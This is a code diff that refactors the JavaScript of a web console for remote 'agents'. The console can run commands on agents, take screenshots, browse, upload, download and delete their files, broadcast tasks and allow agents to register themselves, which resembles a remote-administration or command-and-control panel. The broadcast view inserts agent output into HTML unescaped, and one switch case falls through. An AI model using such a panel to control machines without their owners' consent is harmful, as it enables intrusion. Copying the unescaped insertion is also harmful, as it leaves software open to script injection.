@@ -250,10 +250,12 @@
         <script src="js/sutcp.js"></script>
 
         <script>
+            // Target of current task object being constructed.
             var target = ""
+            // Whatever current task will be broadcasted or send to only one agent (controls how result will be displayed).
             var broadcast = false
             
-            // FS browser content
+            // FS browser context.
             var curDir = 'C:\\'
             var selectedFile = ""
             
@@ -264,32 +266,43 @@
             var tasksListXHR
             var agentsUpdateXHR
             var renameXHR
+            var downloadXHR
 
             function escapeHTML(text) {
                 return $('<div/>').text(text).html()
             }
 
             function loadAgentsList() {
+                // Abort previous request if still active.
                 if (agentsUpdateXHR != null) {
                     agentsUpdateXHR.abort()
                     agentsUpdateXHR = null
                 }
+                
                 $("#agents-reload-btn").children(":first").addClass("fa-spin")
                 agentsUpdateXHR = getAgentsList(function (agents, online) {
                     $("#agents-load-error").alert("close")
+                    
+                    // Remove all agents from DOM, we will readd them anyway.
+                    // This is easier than not present/present checks.
                     $(".agents-group").children(".agent-entry").remove()
-                    agents.forEach(function(val) {
-                        splitten = val.split("-")
+                    
+                    agents.forEach(function(agentID) {
+                        // agentIDs are in following format:
+                        //   GROUP-NAME. 
+                        // If agentID doesn't follows this format GROUP
+                        // is assmed to be "unknown".
+                        splitten = agentID.split("-")
                         var group
                         var name
                         var groupName
                         if (splitten.length === 1) {
                             group = "unknown"
                             groupName = "${UNKNOWN_GROUP}"
-                            name = val
+                            name = agentID
                         } else {
                             group = splitten[0]
-                            groupName = "Group " + group
+                            groupName = "${GROUP_PREFIX}" + group
                             name = splitten.slice(1).join("-")
                         }
 
@@ -297,14 +310,16 @@
                             addGroupToDOM(groupName, group)
                         }
                         
-                        addAgentToDOM(group, val, online[val])
+                        addAgentToDOM(group, agentID, online[agentID])
                     })
-
+                    
+                    // Attach event handlers to newly created DOM elements.
                     registerAgentBtnCallback()
-                    $("#agents-reload-btn").children(":first").removeClass("fa-spin")
+                    
                     removeEmptyGroups()
                     updateGroupCounts()
 
+                    // Disable Broadcast button for groups without online agents.
                     var groups = $(".agents-group")
                     for (var i = 0; i < groups.length; i++) {
                         if ($(groups[i]).children(".online-agent").length == 0) {
@@ -313,13 +328,15 @@
                             $(groups[i]).children(".broadcast-btn").removeAttr("disabled")
                         }
                     }
+                    
+                    // Stop icon animation.
+                    $("#agents-reload-btn").children(":first").removeClass("fa-spin")
+                    agentsUpdateXHR = null
                 }, function(msg) {
                     showAlert("agents-load-error", "#agentslist", "${AGENTLIST_UPDATE_FAIL} " + msg)
                     $("#agents-reload-btn").children(":first").removeClass("fa-spin")
                 })
             }
-
-            window.setInterval(loadAgentsList, 5000)
 
             function populateTaskList() {
                 $("#proc-select-option").append("<option>Loading processes list...</option>")
@@ -339,7 +356,10 @@
             }
 
             $(document).ready(loadAgentsList)
+            window.setInterval(loadAgentsList, 5000)
+            $("#agents-reload-btn").click(loadAgentsList)
             
+            // Toggle text on button selfreg button.
             function updateSelfregBtns(newVal) {
                 if (newVal) {
                     $("#selfreg-status").text("${SELFREG_ENABLED}")
@@ -356,8 +376,6 @@
                     console.log("Failed to get selfreg status: " + err)
                 })
             })
-
-            $("#agents-reload-btn").click(loadAgentsList)
             $("#selfreg-enable").click(function (event) {
                 setSelfregStatus(1, updateSelfregBtns, function (err) {
                     console.log("Failed to set selfreg status: " + err)
@@ -370,19 +388,18 @@
             })
 
             $("#logout-btn").click(function(event) {
-                $.ajax({
-                    url: apiPrefix + "/logout",
-                    headers: {
-                        "Authorization": Cookies.get("token")
-                    }
-                }).done(function(data) {
-                    Cookies.remove("token")
-                    Cookies.remove("username")
+                logout(function () {
                     window.location = "login.html"
+                }, function (msg) {
+                    // OOPS. I hope this will never happen because 
+                    // I don't know how to handle it.
                 })
-                event.preventDefault()
             })
 
+            // Update send task form when user changes task type.
+            $("#send-task-type-select").change(updateSendTaskForm)
+            // Reconstruct send task form in accordancewith selected
+            // task type and broadcast/unicast status.
             function updateSendTaskForm() {
                 if (broadcast) {
                     if ($("#kill-proc-option").css("display") != "none") {
@@ -402,11 +419,8 @@
                 }
             }
 
-            function updateRenameForm() {
-                $("#old-agent-name").text(target)
-                $("#new-agent-name").val(target)
-            }
-            
+            // Reconstruct FS browser modal in accordance with current 
+            // context values (curDir and target global variables).
             function updateFSForm() {
                 $("#agent-name").text(target)
                 $("#fs-path").text(curDir)
@@ -429,6 +443,7 @@
                 })
             }
             
+            // Register event listeners for newly added DOM elements.
             function registerFSBtnCallback() {
                 $(".fs-link").click(function (event) {
                     var entry = $(event.target).parent().parent(".fs-entry")
@@ -437,7 +452,8 @@
                         updateFSForm()
                     } else {
                         showNotify("fs-alert", "#fs-browser-body", "${WAITING_AGENT_UPLOAD}")
-                        downloadFile(target, entry.data("path"), function (url) {
+                        // downloadXHR is used to abort file download if user closes FS browser modal.
+                        downloadXHR = downloadFile(target, entry.data("path"), function (url) {
                             $("#fs-alert").alert("close")
                             var link = document.createElement("a")
                             document.body.appendChild(link)
@@ -445,9 +461,10 @@
                             link.download = entry.data("path")
                             link.click()
                             document.body.removeChild(link)
+                            downloadXHR = null
                         }, function (msg) {
                             showAlert("fs-alert", "#fs-browser-body", "${DOWNLOAD_START_FAIL} " + msg)
-                            console.log("err " + msg)
+                            downloadXHR = null
                         })
                     }
                     return false
@@ -469,7 +486,14 @@
                     updateFSForm()
                 })
             }
+            $("#fs-browser-modal").on("hidden.bs.modal", function(event){
+                if (downloadXHR != null) {
+                    downloadXHR.abort()
+                    downloadXHR = null
+                }
+            })
             
+            // [FS browser] Confirm button in rename file modal.
             $("#fs-rename-submit").click(function (event) {
                 $("#fs-rename-modal").modal("hide")
                 moveFile(target, selectedFile, $("#new-file-path").val(), function () {
@@ -479,19 +503,21 @@
                 }) 
             })
             
+            // [FS browser] Confirm button in delete  file modal.
             $("#delete-confirm-btn").click(function (event) {
                 $("#delete-confirm-modal").modal("hide")
-                deleteFile(target, selectedFile, function () {
+                fsOperationXHR = deleteFile(target, selectedFile, function () {
                     updateFSForm()
                 }, function (msg) {
                     showAlert("fs-alert", "#fs-browser-body", "${DELETE_FAIL} " + msg)
                 }) 
             })
             
+            // [FS browser] "Upload here" button.
             $("#upload-btn").click(function (event) {
                 $("#file-upload").click()
             })
-            
+            // [FS browser] Called when user selected something in file dialog openned by function above.
             $("#file-upload").change(function (event) {
                 var file = $("#file-upload")[0].files[0]
                 showNotify("fs-alert", "#fs-browser-body", "${UPLOAD_WAIT}")
@@ -503,8 +529,8 @@
                 })
             })
 
+            // We modify DOM while loading agent list. We cant register callback ahead-of-time because there is no .agent-btn yet.
             function registerAgentBtnCallback() {
-                // We modify DOM while loading agent list. We cant register callback ahead-of-time because there is no .agent-btn yet.
                 $(".agent-btn").click(function (event) {
                     target = event.currentTarget.dataset.target
                     if (event.currentTarget.dataset.role == "send-task") {
@@ -515,7 +541,8 @@
                         $("#send-task-modal").modal("show")
                     }
                     if (event.currentTarget.dataset.role == "rename-agent") {
-                        updateRenameForm()
+                        $("#old-agent-name").text(target)
+                        $("#new-agent-name").val(target)
                         $("#rename-modal").modal("show")
                     }
                     if (event.currentTarget.dataset.role == "browse-fs") {
@@ -540,8 +567,7 @@
                 })
             }
 
-            $("#send-task-type-select").change(updateSendTaskForm)
-
+            // Confirm agent rename button in modal.
             $("#rename-submit").click(function(event) {
                 $("#rename-submit").text("...")
                 renameXHR = renameAgent(target, $("#new-agent-name").val(), function() {
@@ -552,6 +578,12 @@
                     showAlert("rename-agent-error", "#rename-agent-form", "${RENAME_AGENT_FAIL} " + msg)
                     $("#rename-submit").text("Rename")
                 })
+            })
+            $("#rename-modal").on("hidden.bs.modal", function(event){
+                if (renameXHR != null) {
+                    renameXHR.abort()
+                    renameXHR = null
+                }
             })
 
             $("#send-task-submit").click(function(event) {
@@ -588,18 +620,18 @@
                 }
                 $("#send-task-submit").text("${TASK_RESULT_WAIT}")
                 sendTaskXHR = submitTask(target, payload, function (result) {
-                    if (!broadcast) {
-                        showTaskSendResult(result, payload.type)
-                    } else {
+                    if (broadcast) {
                         showTaskBroadcastResult(result, payload.type)
+                    } else {
+                        showTaskSendResult(result, payload.type)
                     }
                     $("#send-task-submit").text("${SEND_BTN}")
+                    sendTaskXHR = null
                 }, function(msg) {
                     showAlert("task-submit-error", "#send-task-form", "${SUBMIT_TASK_FAIL} " + msg)
                     $("#send-task-submit").text("${SEND_BTN}")
                 })
             })
-
             $("#send-task-modal").on("hidden.bs.modal", function(event){
                 if (sendTaskXHR != null) {
                     sendTaskXHR.abort()
@@ -610,119 +642,77 @@
                     tasksListXHR = null
                 }
             })
-            $("#rename-modal").on("hidden.bs.modal", function(event){
-                if (renameXHR != null) {
-                    renameXHR.abort()
-                    renameXHR = null
-                }
-            })
 
             function showTaskSendResult(result, type) {
                 $("#broadcast-result").hide()
                 $("#screenshot-result").hide()
-                $("#single-result").hide()
+                $("#single-result").show()
+                $("#result-modal").children(".modal-dialog").css("max-width", "500px")
 
+                var status
+                var output
                 if (result.error) {
-                    $("#single-result").show()
-                    $("#result-status-code").text("${STATUS_ERROR_SERVER}")
-                    $("#result-output").text(result.msg)
+                    status = "${STATUS_ERROR_SERVER}"
+                    output = result.msg
                 } else if (result.results[0].error) {
-                    $("#single-result").show()
-                    $("#result-status-code").text("${STATUS_ERROR_AGENT}")
-                    $("#result-output").text(result.results[0].msg)
+                    status = "${STATUS_ERROR_AGENT}"
+                    output = result.results[0].msg
                 } else {
-                    console.log("suc")
                     switch (type) {
                     case "execute_cmd":
-                        $("#result-modal").children(".modal-dialog").css("max-width", "500px")
-                        $("#single-result").show()
-                        $("#result-status-code").text(result.results[0].status_code)
-                        $("#result-output").text(result.results[0].output)
-                        break;
+                        status = result.results[0].status_code
+                        output = result.results[0].output
+                        break
                     case "screenshot":
+                        $("#single-result").hide()
                         $("#result-modal").children(".modal-dialog").css("max-width", "100%")
+                        $("#screenshot-result").show()
                         var imgurl = result.results[0].url
                         $("#screenshot-result").children().remove()
-                        $("#screenshot-result").show()
                         $("#screenshot-result").append('<a href="' + imgurl + '"><img class="screenshot-img" src="' + imgurl + '" /></a>')
                     case "update":
-                        $("#result-modal").children(".modal-dialog").css("max-width", "500px")
-                        $("#result-status-code").text("0")
-                        $("#result-output").text("Update process initiated")
-                        break;
+                        status = "0"
+                        output = "Update process initiated"
+                        break
                     }
                 }
+                $("#result-status-code").text(status)
+                $("#result-output").text(output)
                 $(".modal").modal("hide")
                 $("#result-modal").modal("show")
             }
 
             function showTaskBroadcastResult(result, type) {
-                $("#broadcast-result").show()
+                // #single-result is formatted a bit differently and we use #broadcast-result for broadcasts instead.
                 $("#single-result").hide()
                 $("#screenshot-result").hide()
-
+                $("#broadcast-result").show()
+                
                 $("#broadcast-result").children().remove()
-
                 var res = result.results
                 for (var i = 0; i < res.length; i++) {
-                    switch (type) {
-                    case "execute_cmd":
-                        $("#result-modal").children(".modal-dialog").css("max-width", "500px")
-                        var status
-                        var output
-                        if (res[i].error) {
-                            status = "${STATUS_ERROR_AGENT}"
-                            output = res[i].msg
-                        } else {
-                            status = res[i].status_code
-                            output = res[i].output
+                    var resContents
+                    if (res[i].error) {
+                        resContents = 'Status: <span>${STATUS_ERROR_AGENT}</span><pre>' + res[i].msg + '</pre>'
+                    } else {
+                        switch (type) {
+                        case "execute_cmd":
+                            $("#result-modal").children(".modal-dialog").css("max-width", "500px")
+                            resContents = 'Status: <span>' + res[i].status_code + '</span><pre>' + res[i].output + '</pre>'
+                            break
+                        case "screenshot":
+                            $("#result-modal").children(".modal-dialog").css("max-width", "100%")
+                            var imgurl = result.results[0].url    
+                            resContents = '<a href="' + imgurl + '"><img class="screenshot-img" src="' + imgurl + '" /></a>'
+                            break
+                        case "update":
+                            $("#result-modal").children(".modal-dialog").css("max-width", "500px")
+                            resContents = '<pre>Update process initiated</pre>'
+                            break
                         }
-
-                        $("#broadcast-result").append('\
-                                <b>' + res[i].target + '</b>\
-                                <div>\
-                                    Status: <span>' +  status + '</span>\
-                                    <pre>' + output + '</pre>\
-                                </div>')
-                        break;
-                    case "screenshot":
-                        $("#result-modal").children(".modal-dialog").css("max-width", "100%")
-                        var imgurl = result.results[0].url
-                        if (res[i].error) {
-                            status = "${STATUS_ERROR_AGENT}"
-                            output = res[i].msg
-                            $("#broadcast-result").append('\
-                                    <b>' + res[i].target + '</b>\
-                                    <div>\
-                                        Status: <span>' +  status + '</span>\
-                                        <pre>' + output + '</pre>\
-                                    </div>')
-                            return
-                        }
-                            
-                        $("#broadcast-result").append('\
-                                <b>' + res[i].target + '</b>\
-                                <div>\
-                                    <a href="' + imgurl + '"><img class="screenshot-img" src="' + imgurl + '" /></a>\
-                                </div>')
-                        break
-                    case "update":
-                        $("#result-modal").children(".modal-dialog").css("max-width", "100%")
-                        if (res[i].error) {
-                            $("#broadcast-result").append('\
-                                    <b>' + res[i].target + '</b>\
-                                    <div>\
-                                        <pre>' + res[i].msg + '</pre>\
-                                    </div>')
-                            return
-                        }
-                        $("#broadcast-result").append('\
-                                <b>' + res[i].target + '</b>\
-                                <div>\
-                                    <pre>Update process initiated</pre>\
-                                </div>')
-                        break
                     }
+                    
+                    $("#broadcast-result").append('<b>' + res[i].target + '</b><div>' + resContents + '</div>')
                 }
                 $(".modal").modal("hide")
                 $("#result-modal").modal("show")
